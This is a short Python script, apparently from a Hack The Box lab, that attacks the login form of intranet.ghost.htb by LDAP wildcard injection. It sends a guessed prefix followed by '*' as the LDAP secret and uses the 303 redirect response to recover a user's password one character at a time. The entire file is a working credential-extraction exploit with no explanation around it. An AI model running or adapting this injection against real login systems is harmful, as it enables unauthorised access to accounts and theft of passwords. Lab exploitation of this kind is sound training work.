import string
import requests

url = 'http://intranet.ghost.htb:8008/login'

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
}

files = {
    '1_ldap-username': (None, 'gitea_temp_principal'),
    '1_ldap-secret': (None, 's*'),
    '0': (None, '[{},"$K1"]')
}


passw = ""
while True:
    for char in string.ascii_lowercase + string.digits:
        files = {
            '1_ldap-username': (None, 'cassandra.shelton'),
            '1_ldap-secret': (None, f'{passw}{char}*'),
            '0': (None, '[{},"$K1"]')
        }
        res = requests.post(url, headers=headers, files=files)
        if res.status_code == 303:
            passw += char
            print(f"Passwd: {passw}")
            break
    else:
        break
print(passw)
